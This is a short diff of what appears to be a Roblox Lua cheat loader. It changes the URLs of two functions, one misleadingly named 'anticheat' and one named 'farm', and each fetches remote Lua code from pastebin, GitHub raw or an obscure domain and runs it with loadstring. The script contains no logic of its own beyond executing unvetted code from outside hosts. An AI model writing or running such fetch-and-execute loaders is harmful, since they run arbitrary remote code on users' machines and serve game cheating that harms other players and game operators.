@@ -1,8 +1,8 @@
 local function anticheat()
-    loadstring(game:HttpGet("https://egorikusa.space/f0195a5cabd088c6c4836656.lua", true))()
+    loadstring(game:HttpGet("https://pastebin.com/raw/t44fpKcG", true))()
 end
 local function farm()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Joystickplays/psychic-octo-invention/main/yarhm.lua", true))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI"))()
 end
 
 task.spawn(anticheat)
